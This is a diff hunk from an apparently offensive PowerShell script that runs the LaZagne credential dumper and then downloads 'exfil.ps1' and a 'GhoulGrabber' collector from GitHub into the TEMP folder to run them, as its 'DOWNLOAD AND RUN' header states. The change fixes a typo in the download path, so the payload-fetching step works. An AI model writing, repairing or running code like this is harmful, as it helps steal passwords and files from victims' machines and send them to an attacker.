@@ -149,7 +149,7 @@ Write-Host "LaZagne successfully ran, loading next module"
 $exfilUrl = "https://raw.githubusercontent.com/GHXSTFPS/powershell-bypass/main/V1/Modules/exfil.ps1"
 $exfilDest = Join-Path $env:TEMP "exfil.ps1"
 $ghoulUrl = "https://raw.githubusercontent.com/GHXSTFPS/GhoulGrabber/main/collect.ps1"
-$ghoulDest = Join-Path $env:TENO "ghoul.ps1"
+$ghoulDest = Join-Path $env:TEMP "ghoul.ps1"
 #--------------------------------------------
 # GHOUL GRABBER MODULE (DOWNLOAD AND RUN)
 # -------------------------------------------
